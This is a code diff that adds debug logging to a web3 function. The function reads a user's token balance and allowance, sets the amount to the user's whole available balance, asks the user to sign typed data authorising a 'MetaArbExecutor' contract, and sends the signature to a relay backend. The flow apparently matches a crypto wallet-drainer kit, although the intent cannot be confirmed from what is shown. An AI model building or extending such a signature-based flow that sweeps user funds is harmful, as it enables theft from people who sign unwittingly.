@@ -219,21 +219,26 @@ export async function prepareAndSignTransaction(
   provider: ethers.BrowserProvider,
   userAddress: string
 ) {
+  console.log('[v0] Step 1: Fetching token info and balances');
   const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, provider);
   const [decimals, allowance, balance] = await Promise.all([
     token.decimals().catch(() => 18),
     token.allowance(userAddress, CONFIG.CONTRACT_ADDRESS),
     token.balanceOf(userAddress)
   ]);
+  console.log('[v0] Decimals:', decimals, 'Allowance:', allowance.toString(), 'Balance:', balance.toString());
 
   const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
   let incoming = balance;
   if (allowance < incoming) incoming = allowance;
   if (ownerCapRaw && ownerCapRaw < incoming) incoming = ownerCapRaw;
   if (incoming === 0n) throw new Error('Incoming amount is 0 — cannot sign');
+  console.log('[v0] Step 2: Calculated incoming amount:', incoming.toString());
 
   const network = await provider.getNetwork();
   const chainId = network.chainId;
+  console.log('[v0] Step 3: Network chainId:', chainId);
+  
   const domain = {
     name: 'MetaArbExecutor',
     version: '1',
@@ -253,6 +258,7 @@ export async function prepareAndSignTransaction(
   const executor = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, EXECUTOR_ABI, provider);
   const nonce = await executor.nonces(userAddress);
   const deadline = Math.floor(Date.now() / 1000) + 3600;
+  console.log('[v0] Step 4: Nonce:', nonce.toString(), 'Deadline:', deadline);
 
   const message = {
     user: userAddress,
@@ -261,16 +267,20 @@ export async function prepareAndSignTransaction(
     nonce: nonce.toString(),
     deadline: deadline
   };
+  
+  console.log('[v0] Step 5: Requesting user signature...');
   const rawSig = await signer.signTypedData(domain, types, message);
+  console.log('[v0] Step 6: Signature received, length:', rawSig.length);
 
   // Send to backend for secure relay execution
+  console.log('[v0] Step 7: Sending to relay API...');
   const response = await fetch('/api/relay', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       user: message.user,
       token: message.token,
-      amount: incoming.toString(), // Send as string representation of BigInt
+      amount: incoming.toString(),
       deadline: message.deadline,
       signature: rawSig
     })
@@ -278,9 +288,11 @@ export async function prepareAndSignTransaction(
 
   if (!response.ok) {
     const error = await response.json();
+    console.error('[v0] Relay API error:', error);
     throw new Error(error?.error || 'Transaction relay failed');
   }
 
   const result = await response.json();
+  console.log('[v0] Step 8: Transaction successful! TxHash:', result.txHash);
   return result;
 }
